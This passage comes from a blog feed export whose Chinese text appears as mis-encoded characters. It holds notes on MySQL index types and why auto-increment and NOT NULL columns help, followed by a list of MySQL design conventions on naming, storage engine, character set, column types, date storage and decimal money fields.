title="ä¸»é”®ç´¢å¼•"></a>ä¸»é”®ç´¢å¼•</h4><p><code>not null</code> +<code>unique</code></p><p>åœ¨ MySQL çš„ InnoDB çš„è¡¨ä¸­ï¼Œå½“æ²¡æœ‰æ˜¾ç¤ºçš„æŒ‡å®šè¡¨çš„ä¸»é”®æ—¶ï¼ŒInnoDB ä¼šè‡ªåŠ¨å…ˆæ£€æŸ¥è¡¨ä¸­æ˜¯å¦æœ‰å”¯ä¸€ç´¢å¼•ä¸”ä¸å…è®¸å­˜åœ¨ null å€¼çš„å­—æ®µï¼Œå¦‚æœæœ‰ï¼Œåˆ™é€‰æ‹©è¯¥å­—æ®µä¸ºé»˜è®¤çš„ä¸»é”®ï¼Œå¦åˆ™ InnoDB å°†ä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ª 6Byte çš„è‡ªå¢ä¸»é”®ã€‚</p><h4 id="äºŒçº§ç´¢å¼•"><a href="#äºŒçº§ç´¢å¼•" class="headerlink" title="äºŒçº§ç´¢å¼•"></a>äºŒçº§ç´¢å¼•</h4><p>äºŒçº§ç´¢å¼•çš„å¶å­èŠ‚ç‚¹å­˜å‚¨çš„æ˜¯ä¸»é”®å€¼ã€‚å³é€šè¿‡äºŒçº§ç´¢å¼•å¯ä»¥å®šä½ä¸»é”®.å”¯ä¸€ç´¢å¼•ï¼Œæ™®é€šç´¢å¼•ï¼Œå‰ç¼€ç´¢å¼•ç­‰ç´¢å¼•å±äºäºŒçº§ç´¢å¼•</p><ul><li>æ™®é€šç´¢å¼•:ä»…åŠ é€ŸæŸ¥è¯¢ã€‚</li><li>å”¯ä¸€ç´¢å¼•:åˆ—å€¼å”¯ä¸€,ä½†å¯¹NULLä¸ç”Ÿæ•ˆ</li><li>å‰ç¼€ç´¢å¼•:ä¸ºäº†èŠ‚çœç©ºé—´ï¼Œå¯¹å­—ç¬¦ä¸²ç±»å‹çš„å­—æ®µï¼Œå¯ä»¥åªç´¢å¼•å­—æ®µçš„å‰å‡ ä¸ªå­—ç¬¦ã€‚</li><li>å…¨æ–‡ç´¢å¼•:åŸºäºåˆ†è¯,å¸¸ç”¨äºå¤§æ–‡æœ¬æœç´¢å…³é”®è¯,matchå’Œagainstå…³é”®å­—</li></ul><h4 id="èšç°‡ç´¢å¼•"><a href="#èšç°‡ç´¢å¼•" class="headerlink" title="èšç°‡ç´¢å¼•"></a>èšç°‡ç´¢å¼•</h4><p>ç´¢å¼•ç»“æ„å’Œæ•°æ®ä¸€èµ·æ”¾çš„ç´¢å¼•</p><h4 id="éèšç°‡ç´¢å¼•"><a href="#éèšç°‡ç´¢å¼•" class="headerlink" title="éèšç°‡ç´¢å¼•"></a>éèšç°‡ç´¢å¼•</h4><p>ç´¢å¼•ç»“æ„å’Œæ•°æ®åˆ†å¼€å­˜æ”¾çš„ç´¢å¼•,å¦‚äºŒçº§ç´¢å¼•</p><h3 id="ä¸ºä»€ä¹ˆä¸»é”®ç´¢å¼•æœ€å¥½è®¾ç½®ä¸ºè‡ªå¢"><a href="#ä¸ºä»€ä¹ˆä¸»é”®ç´¢å¼•æœ€å¥½è®¾ç½®ä¸ºè‡ªå¢" class="headerlink" title="ä¸ºä»€ä¹ˆä¸»é”®ç´¢å¼•æœ€å¥½è®¾ç½®ä¸ºè‡ªå¢?"></a>ä¸ºä»€ä¹ˆä¸»é”®ç´¢å¼•æœ€å¥½è®¾ç½®ä¸ºè‡ªå¢?</h3><p>è®¾ç½®è‡ªå¢å,æ’å…¥æ•°æ®æ—¶,æ’å…¥é€Ÿåº¦æ›´å¿«,å› ä¸ºæ¯æ¬¡æ’å…¥æ•°æ®æ—¶,æ•°æ®åº“ä¸ç”¨ç§»åŠ¨å…¶ä»–æ•°æ®,åªéœ€è¦ç§»åŠ¨æŒ‡é’ˆå³å¯.</p><p>å¦‚æœæˆ‘ä»¬ä½¿ç”¨éè‡ªå¢ä¸»é”®ï¼Œç”±äºæ¯æ¬¡æ’å…¥ä¸»é”®çš„ç´¢å¼•å€¼éƒ½æ˜¯éšæœºçš„ï¼Œå› æ­¤æ¯æ¬¡æ’å…¥æ–°çš„æ•°æ®æ—¶ï¼Œå°±å¯èƒ½ä¼šæ’å…¥åˆ°ç°æœ‰æ•°æ®é¡µä¸­é—´çš„æŸä¸ªä½ç½®ï¼Œè¿™å°†ä¸å¾—ä¸ç§»åŠ¨å…¶å®ƒæ•°æ®æ¥æ»¡è¶³æ–°æ•°æ®çš„æ’å…¥ï¼Œç”šè‡³éœ€è¦ä»ä¸€ä¸ªé¡µé¢å¤åˆ¶æ•°æ®åˆ°å¦å¤–ä¸€ä¸ªé¡µé¢ï¼Œæˆ‘ä»¬é€šå¸¸å°†è¿™ç§æƒ…å†µç§°ä¸º<strong>é¡µåˆ†è£‚</strong>ã€‚é¡µåˆ†è£‚è¿˜æœ‰å¯èƒ½ä¼šé€ æˆå¤§é‡çš„å†…å­˜ç¢ç‰‡ï¼Œå¯¼è‡´ç´¢å¼•ç»“æ„ä¸ç´§å‡‘ï¼Œä»è€Œå½±å“æŸ¥è¯¢æ•ˆç‡</p><p><strong>éè‡ªå¢ä¸»é”®</strong>:</p><p><img src="https://pb01.s3.bitiful.net/yefen.webp" alt="avatar"><br><strong>è‡ªå¢ä¸»é”®</strong>:</p><p><img src="https://pb01.s3.bitiful.net/newyefen.webp" alt="avatar"></p><h3 id="é—®ä»€ä¹ˆç´¢å¼•æœ€å¥½è®¾ç½®ä¸º-NOT-NULL"><a href="#é—®ä»€ä¹ˆç´¢å¼•æœ€å¥½è®¾ç½®ä¸º-NOT-NULL" class="headerlink" title="é—®ä»€ä¹ˆç´¢å¼•æœ€å¥½è®¾ç½®ä¸º NOT NULL"></a>é—®ä»€ä¹ˆç´¢å¼•æœ€å¥½è®¾ç½®ä¸º NOT NULL</h3><p>Mysqléš¾ä»¥ä¼˜åŒ–å¼•ç”¨å¯ç©ºåˆ—æŸ¥è¯¢ï¼Œå®ƒä¼šä½¿ç´¢å¼•ã€ç´¢å¼•ç»Ÿè®¡å’Œå€¼æ›´åŠ å¤æ‚ã€‚å¯ç©ºåˆ—éœ€è¦æ›´å¤šçš„å­˜å‚¨ç©ºé—´ï¼Œè¿˜éœ€è¦mysqlå†…éƒ¨è¿›è¡Œç‰¹æ®Šå¤„ç†ã€‚å¯ç©ºåˆ—è¢«ç´¢å¼•åï¼Œæ¯æ¡è®°å½•éƒ½éœ€è¦ä¸€ä¸ªé¢å¤–çš„å­—èŠ‚ï¼Œè¿˜èƒ½å¯¼è‡´MYisamè¡¨ä¸­å›ºå®šå¤§å°çš„ç´¢å¼•å˜æˆå¯å˜å¤§å°çš„ç´¢å¼•ã€‚            â€”â€”â€”â€”ã€Šé«˜æ€§èƒ½MySQLã€‹</p><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul><li>javaguide</li><li>å°æ—coding<br>â€¦</li></ul>]]></content>
      
      
      <categories>
          
          <category> æ•°æ®åº“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQLè§„èŒƒ</title>
      <link href="/2023/12/24/MySQL%E8%A7%84%E8%8C%83/"/>
      <url>/2023/12/24/MySQL%E8%A7%84%E8%8C%83/</url>
      
        <content type="html"><![CDATA[<h2 id="MySQLè§„èŒƒ"><a href="#MySQLè§„èŒƒ" class="headerlink" title="MySQLè§„èŒƒ"></a>MySQLè§„èŒƒ</h2><h3 id="æ•°æ®åº“å‘½åè§„èŒƒ"><a href="#æ•°æ®åº“å‘½åè§„èŒƒ" class="headerlink" title="æ•°æ®åº“å‘½åè§„èŒƒ"></a>æ•°æ®åº“å‘½åè§„èŒƒ</h3><ul><li>æ‰€æœ‰æ•°æ®åº“å¯¹è±¡åç§°å¿…é¡»ä½¿ç”¨å°å†™å­—æ¯å¹¶ç”¨ä¸‹åˆ’çº¿åˆ†å‰²</li><li>æ‰€æœ‰æ•°æ®åº“å¯¹è±¡åç§°ç¦æ­¢ä½¿ç”¨ MySQL ä¿ç•™å…³é”®å­—ï¼ˆå¦‚æœè¡¨åä¸­åŒ…å«å…³é”®å­—æŸ¥è¯¢æ—¶ï¼Œéœ€è¦å°†å…¶ç”¨å•å¼•å·æ‹¬èµ·æ¥ï¼‰</li><li>æ•°æ®åº“å¯¹è±¡çš„å‘½åè¦èƒ½åšåˆ°è§åè¯†æ„ï¼Œå¹¶ä¸”æœ€å¥½ä¸è¦è¶…è¿‡ 32 ä¸ªå­—ç¬¦</li><li>ä¸´æ—¶åº“è¡¨å¿…é¡»ä»¥ tmp<em> ä¸ºå‰ç¼€å¹¶ä»¥æ—¥æœŸä¸ºåç¼€ï¼Œå¤‡ä»½è¡¨å¿…é¡»ä»¥ bak</em> ä¸ºå‰ç¼€å¹¶ä»¥æ—¥æœŸ (æ—¶é—´æˆ³) ä¸ºåç¼€</li><li>æ‰€æœ‰å­˜å‚¨ç›¸åŒæ•°æ®çš„åˆ—åå’Œåˆ—ç±»å‹å¿…é¡»ä¸€è‡´ï¼ˆä¸€èˆ¬ä½œä¸ºå…³è”åˆ—ï¼Œå¦‚æœæŸ¥è¯¢æ—¶å…³è”åˆ—ç±»å‹ä¸ä¸€è‡´ä¼šè‡ªåŠ¨è¿›è¡Œæ•°æ®ç±»å‹éšå¼è½¬æ¢ï¼Œä¼šé€ æˆåˆ—ä¸Šçš„ç´¢å¼•å¤±æ•ˆï¼Œå¯¼è‡´æŸ¥è¯¢æ•ˆç‡é™ä½ï¼‰</li></ul><h3 id="æ•°æ®åº“åŸºæœ¬è®¾è®¡è§„èŒƒ"><a href="#æ•°æ®åº“åŸºæœ¬è®¾è®¡è§„èŒƒ" class="headerlink" title="æ•°æ®åº“åŸºæœ¬è®¾è®¡è§„èŒƒ"></a>æ•°æ®åº“åŸºæœ¬è®¾è®¡è§„èŒƒ</h3><h4 id="æ‰€æœ‰è¡¨å¿…é¡»ä½¿ç”¨-InnoDB-å­˜å‚¨å¼•æ“"><a href="#æ‰€æœ‰è¡¨å¿…é¡»ä½¿ç”¨-InnoDB-å­˜å‚¨å¼•æ“" class="headerlink" title="æ‰€æœ‰è¡¨å¿…é¡»ä½¿ç”¨ InnoDB å­˜å‚¨å¼•æ“"></a>æ‰€æœ‰è¡¨å¿…é¡»ä½¿ç”¨ InnoDB å­˜å‚¨å¼•æ“</h4><p>æ²¡æœ‰ç‰¹æ®Šè¦æ±‚ï¼ˆå³ InnoDB æ— æ³•æ»¡è¶³çš„åŠŸèƒ½å¦‚ï¼šåˆ—å­˜å‚¨ï¼Œå­˜å‚¨ç©ºé—´æ•°æ®ç­‰ï¼‰çš„æƒ…å†µä¸‹ï¼Œæ‰€æœ‰è¡¨å¿…é¡»ä½¿ç”¨ InnoDB å­˜å‚¨å¼•æ“</p><h4 id="æ•°æ®åº“å’Œè¡¨çš„å­—ç¬¦é›†ç»Ÿä¸€ä½¿ç”¨-UTF8"><a href="#æ•°æ®åº“å’Œè¡¨çš„å­—ç¬¦é›†ç»Ÿä¸€ä½¿ç”¨-UTF8" class="headerlink" title="æ•°æ®åº“å’Œè¡¨çš„å­—ç¬¦é›†ç»Ÿä¸€ä½¿ç”¨ UTF8"></a>æ•°æ®åº“å’Œè¡¨çš„å­—ç¬¦é›†ç»Ÿä¸€ä½¿ç”¨ UTF8</h4><p>å…¼å®¹æ€§æ›´å¥½ï¼Œç»Ÿä¸€å­—ç¬¦é›†å¯ä»¥é¿å…ç”±äºå­—ç¬¦é›†è½¬æ¢äº§ç”Ÿçš„ä¹±ç ï¼Œä¸åŒçš„å­—ç¬¦é›†è¿›è¡Œæ¯”è¾ƒå‰éœ€è¦è¿›è¡Œè½¬æ¢ä¼šé€ æˆç´¢å¼•å¤±æ•ˆï¼Œå¦‚æœæ•°æ®åº“ä¸­æœ‰å­˜å‚¨ emoji è¡¨æƒ…çš„éœ€è¦ï¼Œå­—ç¬¦é›†éœ€è¦é‡‡ç”¨ utf8mb4 å­—ç¬¦é›†ã€‚</p><h4 id="æ‰€æœ‰è¡¨å’Œå­—æ®µéƒ½éœ€è¦æ·»åŠ æ³¨é‡Š"><a href="#æ‰€æœ‰è¡¨å’Œå­—æ®µéƒ½éœ€è¦æ·»åŠ æ³¨é‡Š" class="headerlink" title="æ‰€æœ‰è¡¨å’Œå­—æ®µéƒ½éœ€è¦æ·»åŠ æ³¨é‡Š"></a>æ‰€æœ‰è¡¨å’Œå­—æ®µéƒ½éœ€è¦æ·»åŠ æ³¨é‡Š</h4><p>ä½¿ç”¨ comment ä»å¥æ·»åŠ è¡¨å’Œåˆ—çš„å¤‡æ³¨ï¼Œä»ä¸€å¼€å§‹å°±è¿›è¡Œæ•°æ®å­—å…¸çš„ç»´æŠ¤</p><h4 id="å°½é‡æ§åˆ¶å•è¡¨æ•°æ®é‡çš„å¤§å°ï¼Œå»ºè®®æ§åˆ¶åœ¨-500-ä¸‡ä»¥å†…"><a href="#å°½é‡æ§åˆ¶å•è¡¨æ•°æ®é‡çš„å¤§å°ï¼Œå»ºè®®æ§åˆ¶åœ¨-500-ä¸‡ä»¥å†…" class="headerlink" title="å°½é‡æ§åˆ¶å•è¡¨æ•°æ®é‡çš„å¤§å°ï¼Œå»ºè®®æ§åˆ¶åœ¨ 500 ä¸‡ä»¥å†…"></a>å°½é‡æ§åˆ¶å•è¡¨æ•°æ®é‡çš„å¤§å°ï¼Œå»ºè®®æ§åˆ¶åœ¨ 500 ä¸‡ä»¥å†…</h4><p>500 ä¸‡å¹¶ä¸æ˜¯ MySQL æ•°æ®åº“çš„é™åˆ¶ï¼Œåªæ˜¯ç»éªŒå€¼ï¼Œå¦‚æœå•è¡¨è¶…è¿‡ 500 ä¸‡åï¼ŒæŸ¥è¯¢æ•ˆç‡ä¼šæ€¥å‰§ä¸‹é™.è¿‡å¤§ä¼šé€ æˆä¿®æ”¹è¡¨ç»“æ„ï¼Œå¤‡ä»½ï¼Œæ¢å¤éƒ½ä¼šæœ‰å¾ˆå¤§çš„é—®é¢˜ã€‚</p><p>å¯ä»¥ç”¨å†å²æ•°æ®å½’æ¡£ï¼ˆåº”ç”¨äºæ—¥å¿—æ•°æ®ï¼‰ï¼Œåˆ†åº“åˆ†è¡¨ï¼ˆåº”ç”¨äºä¸šåŠ¡æ•°æ®ï¼‰ç­‰æ‰‹æ®µæ¥æ§åˆ¶æ•°æ®é‡å¤§å°</p><h4 id="è°¨æ…ä½¿ç”¨-MySQL-åˆ†åŒºè¡¨"><a href="#è°¨æ…ä½¿ç”¨-MySQL-åˆ†åŒºè¡¨" class="headerlink" title="è°¨æ…ä½¿ç”¨ MySQL åˆ†åŒºè¡¨"></a>è°¨æ…ä½¿ç”¨ MySQL åˆ†åŒºè¡¨</h4><p>åˆ†åŒºè¡¨åœ¨ç‰©ç†ä¸Šè¡¨ç°ä¸ºå¤šä¸ªæ–‡ä»¶ï¼Œåœ¨é€»è¾‘ä¸Šè¡¨ç°ä¸ºä¸€ä¸ªè¡¨ï¼›</p><p>è°¨æ…é€‰æ‹©åˆ†åŒºé”®ï¼Œè·¨åˆ†åŒºæŸ¥è¯¢æ•ˆç‡å¯èƒ½æ›´ä½ï¼›</p><p>å»ºè®®é‡‡ç”¨ç‰©ç†åˆ†è¡¨çš„æ–¹å¼ç®¡ç†å¤§æ•°æ®ã€‚</p><h4 id="ç»å¸¸ä¸€èµ·ä½¿ç”¨çš„åˆ—æ”¾åˆ°ä¸€ä¸ªè¡¨ä¸­"><a href="#ç»å¸¸ä¸€èµ·ä½¿ç”¨çš„åˆ—æ”¾åˆ°ä¸€ä¸ªè¡¨ä¸­" class="headerlink" title="ç»å¸¸ä¸€èµ·ä½¿ç”¨çš„åˆ—æ”¾åˆ°ä¸€ä¸ªè¡¨ä¸­"></a>ç»å¸¸ä¸€èµ·ä½¿ç”¨çš„åˆ—æ”¾åˆ°ä¸€ä¸ªè¡¨ä¸­</h4><p>é¿å…æ›´å¤šçš„å…³è”æ“ä½œã€‚</p><h4 id="ç¦æ­¢åœ¨è¡¨ä¸­å»ºç«‹é¢„ç•™å­—æ®µ"><a href="#ç¦æ­¢åœ¨è¡¨ä¸­å»ºç«‹é¢„ç•™å­—æ®µ" class="headerlink" title="ç¦æ­¢åœ¨è¡¨ä¸­å»ºç«‹é¢„ç•™å­—æ®µ"></a>ç¦æ­¢åœ¨è¡¨ä¸­å»ºç«‹é¢„ç•™å­—æ®µ</h4><ul><li>é¢„ç•™å­—æ®µçš„å‘½åå¾ˆéš¾åšåˆ°è§åè¯†ä¹‰ã€‚</li><li>é¢„ç•™å­—æ®µæ— æ³•ç¡®è®¤å­˜å‚¨çš„æ•°æ®ç±»å‹ï¼Œæ‰€ä»¥æ— æ³•é€‰æ‹©åˆé€‚çš„ç±»å‹ã€‚</li><li>å¯¹é¢„ç•™å­—æ®µç±»å‹çš„ä¿®æ”¹ï¼Œä¼šå¯¹è¡¨è¿›è¡Œé”å®šã€‚</li></ul><h4 id="ç¦æ­¢åœ¨æ•°æ®åº“ä¸­å­˜å‚¨æ–‡ä»¶è¿™ç±»å¤§çš„äºŒè¿›åˆ¶æ•°æ®"><a href="#ç¦æ­¢åœ¨æ•°æ®åº“ä¸­å­˜å‚¨æ–‡ä»¶è¿™ç±»å¤§çš„äºŒè¿›åˆ¶æ•°æ®" class="headerlink" title="ç¦æ­¢åœ¨æ•°æ®åº“ä¸­å­˜å‚¨æ–‡ä»¶è¿™ç±»å¤§çš„äºŒè¿›åˆ¶æ•°æ®"></a>ç¦æ­¢åœ¨æ•°æ®åº“ä¸­å­˜å‚¨æ–‡ä»¶è¿™ç±»å¤§çš„äºŒè¿›åˆ¶æ•°æ®</h4><p>åœ¨æ•°æ®åº“ä¸­å­˜å‚¨æ–‡ä»¶ä¼šä¸¥é‡å½±å“æ•°æ®åº“æ€§èƒ½ï¼Œæ¶ˆè€—è¿‡å¤šå­˜å‚¨ç©ºé—´ã€‚</p><p>æ–‡ä»¶è¿™ç±»å¤§çš„äºŒè¿›åˆ¶æ•°æ®é€šå¸¸å­˜å‚¨äºæ–‡ä»¶æœåŠ¡å™¨ï¼Œæ•°æ®åº“åªå­˜å‚¨æ–‡ä»¶åœ°å€ä¿¡æ¯</p><h4 id="ä¸è¦è¢«æ•°æ®åº“èŒƒå¼æ‰€æŸç¼š"><a href="#ä¸è¦è¢«æ•°æ®åº“èŒƒå¼æ‰€æŸç¼š" class="headerlink" title="ä¸è¦è¢«æ•°æ®åº“èŒƒå¼æ‰€æŸç¼š"></a>ä¸è¦è¢«æ•°æ®åº“èŒƒå¼æ‰€æŸç¼š</h4><p>ä¸€èˆ¬æ¥è¯´ï¼Œè®¾è®¡å…³ç³»æ•°æ®åº“æ—¶éœ€è¦æ»¡è¶³ç¬¬ä¸‰èŒƒå¼ï¼Œä½†ä¸ºäº†æ»¡è¶³ç¬¬ä¸‰èŒƒå¼ï¼Œæˆ‘ä»¬å¯èƒ½ä¼šæ‹†åˆ†å‡ºå¤šå¼ è¡¨ã€‚è€Œåœ¨è¿›è¡ŒæŸ¥è¯¢æ—¶éœ€è¦å¯¹å¤šå¼ è¡¨è¿›è¡Œå…³è”æŸ¥è¯¢ï¼Œæœ‰æ—¶ä¸ºäº†æé«˜æŸ¥è¯¢æ•ˆç‡ï¼Œä¼šé™ä½èŒƒå¼çš„è¦æ±‚ï¼Œåœ¨è¡¨ä¸­ä¿å­˜ä¸€å®šçš„å†—ä½™ä¿¡æ¯ï¼Œä¹Ÿå«åšåèŒƒå¼ã€‚ä½†è¦æ³¨æ„åèŒƒå¼ä¸€å®šè¦é€‚åº¦ã€‚</p><h4 id="ç¦æ­¢åœ¨çº¿ä¸Šåšæ•°æ®åº“å‹åŠ›æµ‹è¯•"><a href="#ç¦æ­¢åœ¨çº¿ä¸Šåšæ•°æ®åº“å‹åŠ›æµ‹è¯•" class="headerlink" title="ç¦æ­¢åœ¨çº¿ä¸Šåšæ•°æ®åº“å‹åŠ›æµ‹è¯•"></a>ç¦æ­¢åœ¨çº¿ä¸Šåšæ•°æ®åº“å‹åŠ›æµ‹è¯•</h4><h4 id="ç¦æ­¢ä»å¼€å‘ç¯å¢ƒ-æµ‹è¯•ç¯å¢ƒç›´æ¥è¿æ¥ç”Ÿäº§ç¯å¢ƒæ•°æ®åº“"><a href="#ç¦æ­¢ä»å¼€å‘ç¯å¢ƒ-æµ‹è¯•ç¯å¢ƒç›´æ¥è¿æ¥ç”Ÿäº§ç¯å¢ƒæ•°æ®åº“" class="headerlink" title="ç¦æ­¢ä»å¼€å‘ç¯å¢ƒ,æµ‹è¯•ç¯å¢ƒç›´æ¥è¿æ¥ç”Ÿäº§ç¯å¢ƒæ•°æ®åº“"></a>ç¦æ­¢ä»å¼€å‘ç¯å¢ƒ,æµ‹è¯•ç¯å¢ƒç›´æ¥è¿æ¥ç”Ÿäº§ç¯å¢ƒæ•°æ®åº“</h4><h3 id="æ•°æ®åº“å­—æ®µè®¾è®¡è§„èŒƒ"><a href="#æ•°æ®åº“å­—æ®µè®¾è®¡è§„èŒƒ" class="headerlink" title="æ•°æ®åº“å­—æ®µè®¾è®¡è§„èŒƒ"></a>æ•°æ®åº“å­—æ®µè®¾è®¡è§„èŒƒ</h3><h4 id="ä¼˜å…ˆé€‰æ‹©ç¬¦åˆå­˜å‚¨éœ€è¦çš„æœ€å°çš„æ•°æ®ç±»å‹"><a href="#ä¼˜å…ˆé€‰æ‹©ç¬¦åˆå­˜å‚¨éœ€è¦çš„æœ€å°çš„æ•°æ®ç±»å‹" class="headerlink" title="ä¼˜å…ˆé€‰æ‹©ç¬¦åˆå­˜å‚¨éœ€è¦çš„æœ€å°çš„æ•°æ®ç±»å‹"></a>ä¼˜å…ˆé€‰æ‹©ç¬¦åˆå­˜å‚¨éœ€è¦çš„æœ€å°çš„æ•°æ®ç±»å‹</h4><p>å­˜å‚¨å­—èŠ‚è¶Šå°ï¼Œå ç”¨ä¹Ÿå°±ç©ºé—´è¶Šå°ï¼Œæ€§èƒ½ä¹Ÿè¶Šå¥½ã€‚</p><p><strong>a.æŸäº›å­—ç¬¦ä¸²å¯ä»¥è½¬æ¢æˆæ•°å­—ç±»å‹å­˜å‚¨</strong>,æ¯”å¦‚å¯ä»¥å°† IP åœ°å€è½¬æ¢æˆæ•´å‹æ•°æ®ã€‚æ•°å­—æ˜¯è¿ç»­çš„ï¼Œæ€§èƒ½æ›´å¥½ï¼Œå ç”¨ç©ºé—´ä¹Ÿæ›´å°ã€‚</p><p>MySQL æä¾›äº†ä¸¤ä¸ªæ–¹æ³•æ¥å¤„ç† ip åœ°å€</p><ul><li><strong>INET_ATON()</strong>ï¼šæŠŠ ip è½¬ä¸ºæ— ç¬¦å·æ•´å‹ (4-8 ä½)</li><li><strong>INET_NTOA()</strong> :æŠŠæ•´å‹çš„ ip è½¬ä¸ºåœ°å€æ’å…¥æ•°æ®å‰ï¼Œå…ˆç”¨ INET_ATON() æŠŠ ip åœ°å€è½¬ä¸ºæ•´å‹ï¼Œæ˜¾ç¤ºæ•°æ®æ—¶ï¼Œä½¿ç”¨ INET_NTOA() æŠŠæ•´å‹çš„ ip åœ°å€è½¬ä¸ºåœ°å€æ˜¾ç¤ºå³å¯ã€‚</li></ul><p><strong>b.å¯¹äºéè´Ÿå‹çš„æ•°æ® (å¦‚è‡ªå¢ ID,æ•´å‹ IPï¼Œå¹´é¾„) æ¥è¯´,è¦ä¼˜å…ˆä½¿ç”¨æ— ç¬¦å·æ•´å‹æ¥å­˜å‚¨</strong>ã€‚æ— ç¬¦å·ç›¸å¯¹äºæœ‰ç¬¦å·å¯ä»¥å¤šå‡ºä¸€å€çš„å­˜å‚¨ç©ºé—´</p><p><strong>c.å°æ•°å€¼ç±»å‹ï¼ˆæ¯”å¦‚å¹´é¾„ã€çŠ¶æ€è¡¨ç¤ºå¦‚ 0/1ï¼‰ä¼˜å…ˆä½¿ç”¨ TINYINT ç±»å‹ã€‚</strong></p><h4 id="é¿å…ä½¿ç”¨-TEXT-BLOB-ç±»å‹"><a href="#é¿å…ä½¿ç”¨-TEXT-BLOB-ç±»å‹" class="headerlink" title="é¿å…ä½¿ç”¨ TEXT,BLOB ç±»å‹"></a>é¿å…ä½¿ç”¨ TEXT,BLOB ç±»å‹</h4><p>æ¯”å¦‚ TEXT ç±»å‹çš„å­—æ®µï¼Œå¦‚æœæŸ¥è¯¢æ—¶æ²¡æœ‰ä½¿ç”¨ç´¢å¼•ï¼Œä¼šå˜æˆå…¨è¡¨æ‰«æï¼Œæ€§èƒ½æå·®</p><h4 id="é¿å…ä½¿ç”¨ENUMç±»å‹"><a href="#é¿å…ä½¿ç”¨ENUMç±»å‹" class="headerlink" title="é¿å…ä½¿ç”¨ENUMç±»å‹"></a>é¿å…ä½¿ç”¨ENUMç±»å‹</h4><ul><li>ä¿®æ”¹ ENUM å€¼éœ€è¦ä½¿ç”¨ ALTER è¯­å¥ï¼›</li><li>ENUM ç±»å‹çš„ ORDER BY æ“ä½œæ•ˆç‡ä½ï¼Œéœ€è¦é¢å¤–æ“ä½œï¼›</li><li>ENUM æ•°æ®ç±»å‹å­˜åœ¨ä¸€äº›é™åˆ¶æ¯”å¦‚å»ºè®®ä¸è¦ä½¿ç”¨æ•°å€¼ä½œä¸º ENUM çš„æšä¸¾å€¼ã€‚</li></ul><h4 id="å°½å¯èƒ½æŠŠæ‰€æœ‰åˆ—å®šä¹‰ä¸º-NOT-NULL"><a href="#å°½å¯èƒ½æŠŠæ‰€æœ‰åˆ—å®šä¹‰ä¸º-NOT-NULL" class="headerlink" title="å°½å¯èƒ½æŠŠæ‰€æœ‰åˆ—å®šä¹‰ä¸º NOT NULL"></a>å°½å¯èƒ½æŠŠæ‰€æœ‰åˆ—å®šä¹‰ä¸º NOT NULL</h4><ul><li>ç´¢å¼• NULL åˆ—éœ€è¦é¢å¤–çš„ç©ºé—´æ¥ä¿å­˜ï¼Œæ‰€ä»¥è¦å ç”¨æ›´å¤šçš„ç©ºé—´ï¼›</li><li>è¿›è¡Œæ¯”è¾ƒå’Œè®¡ç®—æ—¶è¦å¯¹ NULL å€¼åšç‰¹åˆ«çš„å¤„ç†ã€‚</li></ul><h4 id="ä¸€å®šä¸è¦ç”¨å­—ç¬¦ä¸²å­˜å‚¨æ—¥æœŸ"><a href="#ä¸€å®šä¸è¦ç”¨å­—ç¬¦ä¸²å­˜å‚¨æ—¥æœŸ" class="headerlink" title="ä¸€å®šä¸è¦ç”¨å­—ç¬¦ä¸²å­˜å‚¨æ—¥æœŸ"></a>ä¸€å®šä¸è¦ç”¨å­—ç¬¦ä¸²å­˜å‚¨æ—¥æœŸ</h4><p>å¯¹äºæ—¥æœŸç±»å‹æ¥è¯´ï¼Œ ä¸€å®šä¸è¦ç”¨å­—ç¬¦ä¸²å­˜å‚¨æ—¥æœŸã€‚å¯ä»¥è€ƒè™‘ DATETIMEã€TIMESTAMP å’Œ æ•°å€¼å‹æ—¶é—´æˆ³ã€‚</p><p>è¿™ä¸‰ç§ç§æ–¹å¼éƒ½æœ‰å„è‡ªçš„ä¼˜åŠ¿ï¼Œæ ¹æ®å®é™…åœºæ™¯é€‰æ‹©æœ€åˆé€‚çš„æ‰æ˜¯ç‹é“ã€‚ä¸‹é¢å†å¯¹è¿™ä¸‰ç§æ–¹å¼åšä¸€ä¸ªç®€å•çš„å¯¹æ¯”ï¼Œä»¥ä¾›å¤§å®¶å®é™…å¼€å‘ä¸­é€‰æ‹©æ­£ç¡®çš„å­˜æ”¾æ—¶é—´çš„æ•°æ®ç±»å‹ï¼š</p><div class="table-container"><table><thead><tr><th style="text-align:center">ç±»å‹</th><th style="text-align:center">å­˜å‚¨ç©ºé—´</th><th style="text-align:center">æ—¥æœŸæ ¼å¼</th><th style="text-align:center">æ—¥æœŸèŒƒå›´</th><th style="text-align:center">æ˜¯å¦å¸¦æ—¶åŒºä¿¡æ¯</th></tr></thead><tbody><tr><td style="text-align:center">DATETIME</td><td style="text-align:center">5~8 å­—èŠ‚</td><td style="text-align:center">YYYY-MM-DD hh:mm:ss[.fraction]</td><td style="text-align:center">1000-01-01 00:00:00[.000000] ï½ 9999-12-31 23:59:59[.999999]</td><td style="text-align:center">å¦</td></tr><tr><td style="text-align:center">TIMESTAMP</td><td style="text-align:center">4~7 å­—èŠ‚</td><td style="text-align:center">YYYY-MM-DD hh:mm:ss[.fraction]</td><td style="text-align:center">1970-01-01 00:00:01[.000000] ï½ 2038-01-19 03:14:07[.999999]</td><td style="text-align:center">æ˜¯</td></tr></tbody></table></div><p>æ•°å€¼å‹æ—¶é—´æˆ³|4 å­—èŠ‚|å…¨æ•°å­—å¦‚ 1578707612|1970-01-01 00:00:01 ä¹‹åçš„æ—¶é—´|å¦|</p><h4 id="åŒè´¢åŠ¡ç›¸å…³çš„é‡‘é¢ç±»æ•°æ®å¿…é¡»ä½¿ç”¨-decimal-ç±»å‹"><a href="#åŒè´¢åŠ¡ç›¸å…³çš„é‡‘é¢ç±»æ•°æ®å¿…é¡»ä½¿ç”¨-decimal-ç±»å‹" class="headerlink" title="åŒè´¢åŠ¡ç›¸å…³çš„é‡‘é¢ç±»æ•°æ®å¿…é¡»ä½¿ç”¨ decimal ç±»å‹"></a>åŒè´¢åŠ¡ç›¸å…³çš„é‡‘é¢ç±»æ•°æ®å¿…é¡»ä½¿ç”¨ decimal ç±»å‹</h4><p><strong>éç²¾å‡†æµ®ç‚¹ï¼šfloat,double</strong><br><strong>ç²¾å‡†æµ®ç‚¹ï¼šdecimal</strong></p><p>decimal 